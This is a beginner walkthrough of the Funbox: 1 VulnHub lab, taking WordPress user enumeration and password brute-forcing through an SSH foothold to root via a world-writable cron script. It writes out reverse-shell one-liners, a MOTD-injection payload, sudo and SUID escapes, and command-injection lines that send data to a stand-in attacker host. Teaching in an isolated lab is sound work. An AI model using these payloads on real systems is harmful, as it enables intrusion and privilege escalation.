# Funbox: 1 — VulnHub Walkthrough (Beginner Friendly)

> **Authorized lab use only.** Run this machine inside an isolated virtual network
> (VirtualBox/VMware *host-only* adaptor). Never attack systems you do not own or
> have written permission to test.

| Field | Value |
| --- | --- |
| **Machine** | Funbox: 1 |
| **Difficulty** | **3 — Easy** (stated: *Easy*) |
| **Author** | 0815R2d2 |
| **Released** | 20 Jul 2020 |
| **VulnHub Entry** | <https://vulnhub.com/entry/funbox-1,518/> |
| **Download** | <https://download.vulnhub.com/funbox/FunBox.ova> |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) on VirtualBox, host-only network |
| **Target OS** | Linux |

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

Funbox: 1 is an easy, realistic "boot2root". The author's blurb: *"a real life
scenario, but easy going… enumerate and understand the scenario to get the
root-flag in round about 20 minutes."* It teaches the WordPress attack chain end
to end, plus a very common real-world cron privilege escalation.

- Discovering a host and enumerating an Ubuntu web server.
- Handling a **virtual-host redirect** by editing `/etc/hosts`.
- Enumerating **WordPress** with `wpscan`: finding users, then brute-forcing a
  weak password.
- Getting a foothold over **SSH** (and escaping a restricted shell if you meet one).
- Abusing a **world-writable script that root runs from cron** to become `root`.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). Import the `.ova`, boot it, and keep Kali
on the same host-only network.

> **Note:** the WordPress theme-editor route to a shell requires a WordPress
> **admin** account; on the standard build the user we recover (`joe`) is a normal
> subscriber, so the intended foothold is **SSH**. Where a build lets you also
> recover the `admin` password, the theme-editor reverse shell is a valid
> alternative — treat that as a bonus path.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)
192.168.56.100  08:00:27:ab:cd:ef       PCS Systemtechnik GmbH
192.168.56.101  08:00:27:11:22:33       PCS Systemtechnik GmbH
```

```bash
# Alternative host discovery
sudo netdiscover -r 192.168.56.0/24
```

![arp scan showing the target host](images/01-recon.png)

**Target IP:** `192.168.56.101`

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 21,22,80 -oA scans/services 192.168.56.101
```


> ### 📖 Concept — FTP, and why "anonymous" is the first thing to try
>
> **FTP** (port 21) predates modern authentication. It sends usernames, passwords and
> file contents in **cleartext**, and it has a built-in convention for public access:
> the account **`anonymous`**, traditionally with an email address (or nothing) as the
> password.
>
> ```bash
> ftp target                     # then: anonymous / (blank)
> curl -s ftp://anonymous:@target/
> wget -r ftp://anonymous:@target/          # mirror the whole tree
> nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target
> ```
>
> Inside an FTP session: `ls`, `cd`, `binary` (**switch mode before downloading
> anything non-text** — ASCII mode corrupts binaries), `get`, `mget`, `put`, `recurse`.
>
> **Two things to check immediately.** First, is anonymous access *enabled*? Second, is
> it **writable** — does `put shell.php` succeed? A writable FTP root that overlaps
> the web document root is a web-shell upload with no exploitation required. Also look
> for `backup.zip`, `creds.txt`, `id_rsa`, `web.config` and any `notes.txt` — authors
> leave the next step in a file named something obvious.
>
> ProFTPD 1.3.3c specifically ships a **compile-time backdoor** (`telnet target 6200`
> gives root); check the exact version against Exploit-DB before assuming you need
> credentials.
>
> **Deep dive:** [CONCEPTS §9.5 — FTP](../../docs/CONCEPTS.md#95-ftp--port-21)

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress
|_http-title: Funbox
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:** three services = three attack surfaces. SSH is the likely
> landing spot once we have credentials, and the WordPress site on port 80 is where
> we will hunt for those credentials first.

### 2.1 Handle the virtual-host redirect

Browse to `http://192.168.56.101/`. The site **redirects** to
`http://funbox.fritz.box/`, a hostname our Kali box does not know.

```text
Error: Server not found — funbox.fritz.box
```

> **Why it happens:** the WordPress install is configured with a `Site URL` of
> `funbox.fritz.box`. Apache sends a redirect there; our DNS can't resolve it. We
> fix it by adding a hosts entry so the name points at the target.

```bash
# Append the mapping to your hosts file (needs sudo)
echo "192.168.56.101 funbox.fritz.box" | sudo tee -a /etc/hosts

# Sanity check
ping -c1 funbox.fritz.box
```

```text
PING funbox.fritz.box (192.168.56.101) 56(84) bytes of data.
64 bytes from 192.168.56.101: icmp_seq=1 ttl=64 time=0.4 ms
```

Now `http://funbox.fritz.box/` loads a WordPress blog.

### 2.2 Check robots.txt — and note the dead end

```bash
curl http://funbox.fritz.box/robots.txt
```

```text
User-agent: *
Disallow: /secret/
```

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://funbox.fritz.box/secret/
```

```text
403
```

> **Why it's a dead end:** `/secret/` is a deliberate rabbit hole on this box.
> Learning to *time-box and move on* from a decoy is part of the exercise. We come
> back to the CMS itself.

### 2.3 Enumerate WordPress users with wpscan


> ### 📖 Concept — How does WordPress leak usernames?
>
> WordPress builds author archive URLs from a **numeric user ID**:
>
> ```text
> /wordpress/?author=1   →  301 → /wordpress/author/michael/
> /wordpress/?author=2   →  301 → /wordpress/author/steven/
> ```
>
> The ID counts up from 1 and the redirect target contains the **username**.
> `wpscan -e u` just loops the IDs until they stop resolving. Watch it happen by hand
> in a browser — that is worth more than reading about it.
>
> **The `-e` flag chooses what to enumerate:** `u` users · `p` **plugins** (the most
> common WordPress compromise vector) · `t` themes · `vp`/`vt` only *vulnerable*
> plugins/themes · `cb` config backups (`wp-config.php.bak` — a jackpot) · `dbe`
> database exports.
>
> wpscan also labels *how* it found things, and the labels matter: **Passive
> Detection** means inferred from data the site publishes anyway (RSS, bylines) — the
> site does not notice. **Aggressive Detection** means it actively probed (brute
> forcing author IDs, submitting bad logins to read error messages) — which writes
> log entries.
>
> **Why usernames matter:** they are half of every credential pair. With two known
> usernames you can attack `wp-login.php` *and* SSH directly instead of guessing both
> halves.
>
> **Deep dive:** [CONCEPTS §9.2 — WordPress / wpscan](../../docs/CONCEPTS.md#92-wordpress--wpscan)

```bash
wpscan --url http://funbox.fritz.box/ --enumerate u
```

```text
[+] Enumerating Users (via Passive and Aggressive Methods)
[i] User(s) Identified:
[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
[+] joe
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

> **Why it works:** WordPress leaks which users exist through author archives and
> login error messages. Knowing the usernames is half of a password attack.

![nmap and wpscan output](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Brute-force a weak WordPress password


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
wpscan --url http://funbox.fritz.box/ \
  --usernames joe \
  --passwords /usr/share/wordlists/rockyou.txt
```

```text
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - joe / 12345
[+] Valid Combinations Found:
 | Username: joe, Password: 12345
```

> **Why it works:** `joe` chose a password that is the 3rd entry in `rockyou.txt`.
> No rate-limiting or lockout is in place, so the attack completes in seconds. This
> is the single most common real-world breach pattern: **weak, guessable
> passwords**.

> **Harden note:** `wpscan` wording varies by version (`Xmlrpc`/`wp-login`); the
> finding — `joe : 12345` — is the same.

### 3.2 Log in over SSH

```bash
ssh joe@192.168.56.101
# password: 12345
```

```text
joe@funbox:~$ id
uid=1000(joe) gid=1000(joe) groups=1000(joe)
joe@funbox:~$ whoami
joe
```

> **Why it works:** the same weak password unlocks the system's SSH service. Broken
> password hygiene is a cross-protocol problem — one guessable credential opened
> both the CMS and the OS account.

**If you land in a restricted shell (`rbash`).** Some builds give `joe` a restricted
shell, where commands like `cd` or paths are blocked. Escape it by asking SSH to
run a fresh, unrestricted shell:

```bash
ssh joe@192.168.56.101 -t "bash --noprofile"
```

```text
joe@funbox:~$ echo $SHELL
/bin/bash
```

> **Why it works:** `bash --noprofile` starts a shell that skips the startup files
> which imposed the restriction, giving you a normal interactive shell.

**Alternate foothold (some builds):** if `joe`'s FTP account can write into the
WordPress web root, you can upload a PHP reverse shell instead and trigger it over
HTTP. Not required here — it is a bonus path when present.

![The reverse shell / SSH foothold](images/04-foothold.png)
![Shell as joe](images/05-shell.png)

> **Flags:** if this build ships `user.txt`, it is normally in `/home/<user>/`.
> The main objective is `root`.

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

Start with the standard sweep as `joe`:


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)
> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)
> ### 📖 Concept — Finding files root executes that *you* can write
>
> This is the classic Linux privilege-escalation question: *is there anything that
> runs with elevated privileges whose contents I control?*
>
> ```bash
> find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" \
>      -not -path "/dev/*" -not -path "/run/*" 2>/dev/null
> find / -type f -perm -ug=rwx 2>/dev/null                    # rwx for user AND group
> find / -xdev -type f -perm -0002 -user root 2>/dev/null      # world-writable, root-owned
> ```
>
> `-perm -0002` tests the **other-write** bit. `-xdev` keeps the search on one
> filesystem so you do not wander into `/proc`.
>
> **High-value targets, in rough order of usefulness:**
>
> | Path | Why |
> | --- | --- |
> | **`/etc/passwd`** | Append a UID-0 account → `su` → root |
> | **`/etc/update-motd.d/*`** | Scripts run **as root on every SSH login** (MOTD injection) |
> | `/etc/sudoers`, `/etc/sudoers.d/*` | Add yourself a `NOPASSWD` rule |
> | `/etc/shadow` | Replace a hash with one you know |
> | `/etc/ld.so.preload` | A library loaded into **every** process, as root |
> | `/etc/crontab`, `/etc/cron.*` | Add a root job |
> | `/etc/exports` | Add `no_root_squash` to an NFS export |
> | root-owned scripts in `/opt`, `/srv`, `/usr/local` | Frequently world-writable by mistake |
> | any user's `~/.ssh/authorized_keys` | Passwordless SSH as them |
>
> **MOTD injection deserves special mention.** On Ubuntu/Debian, `pam_motd` runs every
> script in `/etc/update-motd.d/` during SSH login, historically **as root**. If any
> is writable by you, append a payload and log in again:
>
> ```bash
> echo 'bash -c "bash -i >& /dev/tcp/192.168.56.10/9090 0>&1"' >> /etc/update-motd.d/00-header
> exit ; ssh user@target      # → root reverse shell
> ```
>
> Use `>>` to **append** — `>` truncates the script and breaks the MOTD, which is how
> you end up wondering why nothing happened. Verify with `tail`.
>
> **Deep dive:** [CONCEPTS §15.6 — Writable files](../../docs/CONCEPTS.md#156-writable-files-and-directories) ·
> [§15.11 — MOTD injection](../../docs/CONCEPTS.md#1511-motd-injection)
> ### 📖 Concept — Cron jobs, and pspy for the ones you cannot see
>
> **cron** runs commands on a schedule. Jobs may be defined per-user
> (`crontab -l`), system-wide (`/etc/crontab`), or as drop-ins (`/etc/cron.d/`,
> `/etc/cron.{hourly,daily,weekly,monthly}/`).
>
> ```bash
> cat /etc/crontab
> ls -la /etc/cron.*
> crontab -l
> ls -la /var/spool/cron/crontabs/
> ```
>
> The `/etc/crontab` fields are `min hour dom mon dow **user** command` — note the
> *user* column, which per-user crontabs do not have. That column is what makes a
> system cron job run as root.
>
> **Three exploitable patterns:**
>
> 1. **The script itself is writable** → append
>    `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`, wait, then run `/tmp/rb -p`.
> 2. **The script calls a binary by a relative name** (`service`, `tar`, `python`) →
>    **PATH hijack**: create `~/evil/service` containing your payload and
>    `export PATH=~/evil:$PATH`. Check whether cron's own `PATH=` line defeats this.
> 3. **Wildcard injection** — a job runs `tar czf backup.tar.gz *` → create files
>    named `--checkpoint=1` and `--checkpoint-action=exec=/tmp/shell.sh`. `tar` reads
>    them as options rather than filenames.
>
> > **The critical gap: root cron jobs that appear in *no* crontab.** They may be
> > installed by a systemd timer, an init script, or a custom daemon.
> >
> > **`pspy` finds them.** It polls `/proc` in a tight loop and therefore sees
> > processes started by *other users* — **without needing root**. Run it and wait 60
> > seconds:
> >
> > ```bash
> > ./pspy64 -pf
> > # watch for: root running /opt/script.py every 5 seconds
> > ```
> >
> > It has won more CTF boxes than almost any other single tool. If `sudo -l`, SUID
> > and capabilities are all dead ends, **run pspy before giving up.**
>
> **Deep dive:** [CONCEPTS §15.5 — Cron jobs](../../docs/CONCEPTS.md#155-cron-jobs)
> ### 📖 Concept — Command injection
>
> The application passes your input to a shell:
>
> ```php
> system("ping -c 4 " . $_GET['host']);
> ```
>
> Break out with a shell **metacharacter** and append your own command:
>
> | Payload | Effect |
> | --- | --- |
> | `; id` | Run sequentially, regardless |
> | `\| id` | Pipe — run next |
> | `\|\| id` | Run only if the first **failed** |
> | `&& id` | Run only if the first **succeeded** |
> | `` `id` `` | Command substitution |
> | `$(id)` | Command substitution — preferred, nestable |
> | `%0a id` | A URL-encoded **newline** — works when `;` and `\|` are filtered |
>
> **When output comes back**, you are done: `<host>;id` prints the result.
>
> **When it does not** ("blind" injection), exfiltrate out-of-band:
>
> ```bash
> $(curl http://attacker/$(whoami))        # data in the URL of a request YOU receive
> $(nslookup $(whoami).attacker.com)       # data in DNS — survives most egress rules
> ; sleep 10                               # a pure timing oracle, needs no network at all
> ```
>
> Run your listener first (`nc -lvnp 80`, or `python3 -m http.server`) and **watch its
> log** — a request arriving with the hostname embedded is your proof, and the log also
> tells you which payload variant the filter allowed through.
>
> **If characters are stripped**, find out exactly what survives. Submit `;|&$\`(){}[]<>`
> as a single string and see which ones come back. Filters are usually a `str_replace`
> of a short list, and almost always miss something — commonly newline, or a doubled
> character (`;;` collapsing to `;` after one removal pass).
>
> **Deep dive:** [CONCEPTS §13.4 — Command injection](../../docs/CONCEPTS.md#134-command-injection)

```bash
id; whoami
sudo -l                                    # can joe run anything as root?
find / -perm -4000 -type f 2>/dev/null     # SUID binaries
find / -writable -type f 2>/dev/null       # files joe is allowed to modify
cat /etc/crontab; ls -la /etc/cron*        # system cron jobs
crontab -l                                 # joe's own cron jobs
```

```text
joe@funbox:~$ find / -writable -type f 2>/dev/null
/var/www/html/... (wp files)
/home/funny/.backup.sh        <-- world-writable (note the 'w' for others)
joe@funbox:~$ ls -la /home/funny/
-rwxrwxrwx  1 funny funny  ...  .backup.sh
```

> **Why it matters:** `/home/funny/.backup.sh` is **world-writable** — literally any
> user on the box (including us) can edit it. If *root* ever executes that script,
> our edit runs **as root**. The question now is: does root run it?

Confirm that root is executing it. The most reliable way is `pspy`, which watches
processes without needing root:

```bash
# Serve pspy64 from Kali, then on the target:
#   python3 -m http.server 8000   (on Kali, in the dir with pspy64)
wget http://192.168.56.10:8000/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64
/tmp/pspy64
```

```text
... CMD: UID=0    PID=...    | /bin/sh /home/funny/.backup.sh
... CMD: UID=0    PID=...    | /bin/sh /home/funny/.backup.sh
```

> **Why it works:** seeing a process with `UID=0` (root) run `/home/funny/.backup.sh`
> on a schedule proves that a **root cron job** executes our world-writable script.
> (The interval is short — roughly every 5 minutes on this build; `pspy` shows it in
> real time. Names/locations can differ between builds, so trust what you observe.)

### 4.1 Inject a root reverse shell


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
# On Kali: start a listener
nc -lvnp 4444
```

```bash
# On the target: append a reverse-shell one-liner to the writable script
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.10 4444 >/tmp/f' >> /home/funny/.backup.sh
```

Wait for the next cron tick (≤ ~5 minutes). The listening `nc` receives a shell —
running as **root**, because root is the one who executed the script:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 43*12
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

> **Why it works:** the scheduler runs the job with the job owner's privileges
> (root). It never checks who last edited the script, so a `chmod 777` script in a
> user's home is effectively a root shell waiting to happen.

Grab the flag (if the build ships one):

```bash
cat /root/root.txt 2>/dev/null
cat /home/*/user.txt 2>/dev/null
```

![The world-writable script and root cron](images/06-privesc.png)
![Root shell](images/07-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Weak WordPress password (`joe:12345`) | WordPress users (login) | Account compromise; credential reuse exposes SSH |
| 2 | Weak OS password / credential reuse | SSH (port 22) | Foothold as `joe` on the host |
| 3 | Information disclosure (user enumeration) | WordPress author archives / login errors | Usernames handed to an attacker |
| 4 | World-writable script executed by root cron | `/home/funny/.backup.sh` | Local privilege escalation to `root` |

## 6. Defensive lessons (blue team)

- **Enforce strong passwords + lockouts.** WordPress should require strong
  passwords and rate-limit/limit failed logins (e.g. a WAF, `fail2ban`, or a
  login-lockout plugin). The same applies to SSH (`sshd` limits, key-only auth).
- **Don't reuse passwords across services.** A CMS password should never be the
  system account password. Use unique credentials or SSO.
- **Stop user enumeration.** Suppress the author-archive leak and genericise login
  error messages; disable XML-RPC if unused (`xmlrpc.php` is a favourite brute-force
  endpoint).
